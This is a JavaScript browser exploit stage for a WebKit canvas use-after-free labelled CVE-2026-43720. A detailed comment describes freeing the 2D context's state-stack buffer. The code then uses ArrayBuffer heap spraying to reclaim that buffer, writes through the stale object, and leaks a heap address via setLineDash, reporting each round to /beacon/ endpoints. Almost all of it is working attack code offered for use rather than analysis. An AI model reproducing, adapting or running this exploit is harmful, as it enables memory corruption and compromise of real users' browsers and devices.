// fa-canvas-fake — CVE-2026-43720 stage-2: state-stack buffer reclaim + heap leak
//
// Buildup (all confirmed on device by fa-canvas-uaf.js v3, runs 1-3):
//   double-create frees the inner CanvasRenderingContext2D while its JS wrapper
//   lives. The freed slot stays mapped and m_canvas stays valid, so stale
//   wrapper METHODS KEEP WORKING (run 3: lineWidth/fillRect via the alias).
//
// The State is NOT a separate allocation by default — it is Vector<State, 1>
// with INLINE capacity, living inside the context object. But:
//
//   ctx.save() is deferred: ++m_unrealizedSaveCount (CanvasRenderingContext2DBase.h:143).
//   The next state setter calls realizeSaves() → realizeSavesLoop() appends
//   exactly one state → the vector grows 1→2 → an OUT-OF-LINE FastMalloc
//   buffer of exactly 2*sizeof(State) (~400-450 bytes) is allocated and
//   becomes m_buffer.
//
// So the getter does: inner.save(); inner.lineWidth = MARKER;
//   - realizeSaves appends one state (out-of-line buffer B = 2*sizeof(State),
//     deterministic capacity) and the marker lands in B[data()[1].lineWidth]
//   - the outer createContext2d then destroys the inner context: the Vector
//     destructor FREES B (with the marker inside), then frees the context
//     slot (stays mapped — methods keep working).
//
// Post-free, spray ArrayBuffers sized 2*sizeof(State):
//   inner.lineWidth reads  MARKER → B freed but NOT reclaimed by our spray
//   inner.lineWidth reads  0      → B reclaimed by a zero-filled AB
//   inner.lineWidth = 1.717        → realizeSaves no-op (count==0, real value
//                                     in the freed context), write lands at
//                                     data()[1].lineWidth INSIDE our AB, then
//                                     drawingContext() → m_canvas valid → safe.
//   inner.setLineDash([...])       → the state's Vector<double> header lands
//                                     in our AB: m_buffer = a fresh FastMalloc
//                                     heap pointer → READ IT = heap address leak.
//
// No fake vtable, no m_canvas deref risk: the context slot is never reclaimed.
// Beacon prefix: VCFK-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCFK-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/VCFK-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT');

  var MARKER = 6.02214076e23;
  var PER = 40;
  // 2*sizeof(State) estimates: sizeof(State) ~192-256 from the WK source
  var SIZES_A = [384, 400, 416, 432, 448, 464, 480, 496, 512];
  var SIZES_B = [256, 288, 320, 352, 544, 576, 608, 640, 672, 704, 736, 768,
                832, 896, 960, 1024];

  var __bitbuf = new ArrayBuffer(8);
  var __bitf = new Float64Array(__bitbuf);
  var __bitu = new Uint32Array(__bitbuf);
  function hex32(n) {
    var s = '';
    for (var i = 3; i >= 0; i--) {
      var b = (n >>> (8 * i)) & 0xff;
      s += (b < 16 ? '0' : '') + b.toString(16);
    }
    return s;
  }
  function f2hex(v) {
    __bitf[0] = v;
    return hex32(__bitu[1]) + hex32(__bitu[0]);
  }

  // Plain trigger (v3 semantics) — for the wrapper-identity round.
  function doubleCreate() {
    var canvas = document.createElement('canvas');
    var inner = null, calledInner = false, innerVia = null;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!calledInner && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          calledInner = true;
          innerVia = prop;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    return { canvas: canvas, outer: outer, inner: inner, via: innerVia };
  }

  // Fake-object trigger: the getter grows the state stack out-of-line and
  // pre-writes the marker before the outer call frees everything.
  function doubleCreateFake() {
    var canvas = document.createElement('canvas');
    var inner = null, calledInner = false, innerVia = null;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!calledInner && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          calledInner = true;
          innerVia = prop;
          inner = canvas.getContext('2d');
          inner.save();               // deferred: ++m_unrealizedSaveCount
          inner.lineWidth = MARKER; // realizeSaves appends ONE state ->
                                    // out-of-line buffer 2*sizeof(State)
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    return { canvas: canvas, outer: outer, inner: inner, via: innerVia };
  }

  function spray(sizes) {
    var abs = [], views = [];
    for (var si = 0; si < sizes.length; si++) {
      for (var c = 0; c < PER; c++) {
        var ab = new ArrayBuffer(sizes[si]);
        abs.push(ab);
        views.push(new Float64Array(ab));
      }
    }
    return { abs: abs, views: views };
  }

  // ── fake round: buffer reclaim + write-through + leak ──────────────────
  function fakeRound(i, sizes, next) {
    var r = doubleCreateFake();
    // silent zone: the state buffer was freed inside doubleCreateFake
    var sp = spray(sizes);
    var rd = 'noinner';
    try { if (r.inner) rd = r.inner.lineWidth; } catch (e) { rd = 'X'; }

    if (rd === MARKER) {
      B('F' + i + '-MISS', 'rd=marker range=' + sizes[0] + '-' + sizes[sizes.length - 1] +
        ' via=' + r.via);
      setTimeout(next, 300);
      return;
    }
    if (rd !== 0) {
      B('F' + i + '-RD', 'rd=' + (typeof rd === 'number' ? f2hex(rd) : String(rd)));
      setTimeout(next, 300);
      return;
    }

    // reclaimed by a zero-filled AB — write-through lands inside our view
    try { r.inner.lineWidth = 1.717; }
    catch (e) { B('F' + i + '-WT-X'); setTimeout(next, 300); return; }

    var hitIdx = -1, hitOff = -1;
    outer:
    for (var j = 0; j < sp.views.length; j++) {
      for (var o = 0; o < sp.views[j].length; o++) {
        if (sp.views[j][o] === 1.717) { hitIdx = j; hitOff = o * 8; break outer; }
      }
    }
    B('F' + i + '-HIT', 'ab=' + hitIdx + ' size=' +
      (hitIdx >= 0 ? sp.abs[hitIdx].byteLength : -1) + ' off=' + hitOff);
    if (hitIdx < 0) { setTimeout(next, 300); return; }

    // heap leak: setLineDash stores a fresh Vector<double> header in the state
    try { r.inner.setLineDash([1.5, 2.5, 3.5, 4.5]); }
    catch (e) { B('F' + i + '-LD-X'); }
    var u8 = new Uint32Array(sp.abs[hitIdx]);
    var out = [], found = 0;
    for (var q = 0; q + 1 < u8.length && found < 16; q += 2) {
      if (u8[q] === 0 && u8[q + 1] === 0) continue;
      if (q * 4 === hitOff) continue; // the 1.717 write-through slot
      out.push((q * 4) + ':' + hex32(u8[q + 1]) + hex32(u8[q]));
      found++;
    }
    BP('F' + i + '-LEAK', out.length ? out.join(' ') : 'none');
    B('F' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  // ── wrapper identity round (R2-style reclaim, W1 === sprayCtxs[k]?) ────
  function wrapRound(next) {
    var N = 200;
    var sprayCanvases = [];
    for (var p = 0; p < N; p++) {
      var c = document.createElement('canvas');
      c.width = 8; c.height = 8;
      sprayCanvases.push(c);
    }
    var r = doubleCreate();
    var sprayCtxs = [];
    for (var s = 0; s < N; s++) sprayCtxs.push(sprayCanvases[s].getContext('2d'));
    var idResult = 'none', aliasIdx = -1, wrapperSame = 'n/a';
    try {
      var ic = r.inner.canvas;
      if (ic === r.canvas) idResult = 'original';
      else {
        for (var k = 0; k < N; k++)
          if (ic === sprayCanvases[k]) { aliasIdx = k; idResult = 'spray' + k; break; }
        if (aliasIdx < 0) idResult = 'other';
      }
      if (aliasIdx >= 0) wrapperSame = String(r.inner === sprayCtxs[aliasIdx]);
    } catch (e) { idResult = 'throw'; }
    B('W-IDENT', 'ident=' + idResult + ' wrapperSame=' + wrapperSame);
    B('W-SURVIVED');
    setTimeout(next, 300);
  }

  // ── run plan ────────────────────────────────────────────────────────────
  var plan = [];
  plan.push(function(next) { fakeRound(1, SIZES_A, next); });
  plan.push(function(next) { fakeRound(2, SIZES_A, next); });
  plan.push(function(next) { fakeRound(3, SIZES_B, next); });
  plan.push(function(next) { wrapRound(next); });

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
